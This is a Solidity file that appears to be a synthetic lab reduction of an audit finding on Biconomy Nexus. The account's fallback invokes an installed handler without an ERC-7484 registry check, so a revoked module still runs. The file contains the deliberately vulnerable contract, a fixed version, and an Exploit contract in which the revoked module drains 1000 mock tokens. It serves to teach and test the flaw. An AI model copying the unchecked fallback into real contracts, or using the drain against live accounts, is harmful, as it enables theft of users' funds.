// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Biconomy Nexus — fallback calls a module without the ERC-7484 registry
    (Spearbit, blockdev, October 2024).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _installFallbackHandler uses withRegistry, and executeFromExecutor
    uses withRegistry, but _fallback invokes the installed handler with no
    _checkRegistry call. After attesters revoke the module, a call that hits
    the fallback still runs it, and the module moves the account's tokens.
    Hook preCheck and the 2771 calldata suffix are omitted. The handler call
    and _checkRegistry are the audited lines (@> VULN). */

interface IERC7484 {
    function check(address module, uint256 moduleType) external view;
}

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "token: balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract ERC7484Registry is IERC7484 {
    mapping(address => bool) public attested;

    function attest(address module) external {
        attested[module] = true;
    }

    function revoke(address module) external {
        attested[module] = false;
    }

    function check(address module, uint256) external view {
        require(attested[module], "ERC7484: threshold not met");
    }
}

contract DrainHandler {
    function sweep(address token, uint256 amt) external {
        NexusAccount(payable(msg.sender)).moduleExecute(token, amt, address(this));
    }
}

contract NexusAccount {
    uint256 public constant MODULE_TYPE_FALLBACK = 3;

    IERC7484 public registry;
    MockToken public token;
    address public fallbackHandler;
    mapping(bytes4 => address) public fallbacks;

    event HandlerCalled(address handler);

    constructor(IERC7484 _registry, MockToken _token, address handler) {
        registry = _registry;
        token = _token;
        fallbackHandler = handler;
        fallbacks[DrainHandler.sweep.selector] = handler;
    }

    function moduleExecute(address asset, uint256 amt, address to) external {
        require(msg.sender == fallbackHandler, "not installed handler");
        MockToken(asset).transfer(to, amt);
    }

    fallback() external payable {
        _fallback(msg.data);
    }

    function _fallback(bytes calldata callData) internal {
        bool success;
        bytes memory result;
        address handler = fallbacks[msg.sig];
        if (handler != address(0)) {
            // @> VULN: handler is called with no _checkRegistry(handler, MODULE_TYPE_FALLBACK)
            (success, result) = handler.call(callData);
            if (!success) {
                assembly {
                    revert(add(result, 0x20), mload(result))
                }
            }
            emit HandlerCalled(handler);
        }
    }
}

contract NexusAccountFixed {
    uint256 public constant MODULE_TYPE_FALLBACK = 3;

    IERC7484 public registry;
    MockToken public token;
    address public fallbackHandler;
    mapping(bytes4 => address) public fallbacks;

    constructor(IERC7484 _registry, MockToken _token, address handler) {
        registry = _registry;
        token = _token;
        fallbackHandler = handler;
        fallbacks[DrainHandler.sweep.selector] = handler;
    }

    function moduleExecute(address asset, uint256 amt, address to) external {
        require(msg.sender == fallbackHandler, "not installed handler");
        MockToken(asset).transfer(to, amt);
    }

    function _checkRegistry(address module, uint256 moduleType) internal view {
        IERC7484 moduleRegistry = registry;
        if (address(moduleRegistry) != address(0)) {
            // this will revert if attestations / threshold are not met
            moduleRegistry.check(module, moduleType);
        }
    }

    fallback() external payable {
        _fallback(msg.data);
    }

    function _fallback(bytes calldata callData) internal {
        address handler = fallbacks[msg.sig];
        _checkRegistry(handler, MODULE_TYPE_FALLBACK);
        (bool success, bytes memory result) = handler.call(callData);
        if (!success) {
            assembly {
                revert(add(result, 0x20), mload(result))
            }
        }
    }
}

contract Exploit {
    MockToken public token;
    ERC7484Registry public registry;
    DrainHandler public handler;
    NexusAccount public account;

    constructor() {
        token = new MockToken();
        registry = new ERC7484Registry();
        handler = new DrainHandler();
        account = new NexusAccount(registry, token, address(handler));
        registry.attest(address(handler));
        token.mint(address(account), 1000 ether);
    }

    function run() external {
        registry.revoke(address(handler));
        require(!registry.attested(address(handler)), "module still attested");
        require(account.fallbacks(DrainHandler.sweep.selector) == address(handler), "handler not installed");

        (bool ok,) = address(account).call(
            abi.encodeWithSelector(DrainHandler.sweep.selector, address(token), 1000 ether)
        );
        require(ok, "unregistered module call failed");
        require(token.balanceOf(address(handler)) == 1000 ether, "module did not take 1000");
        require(token.balanceOf(address(account)) == 0, "account still holds tokens");
    }
}
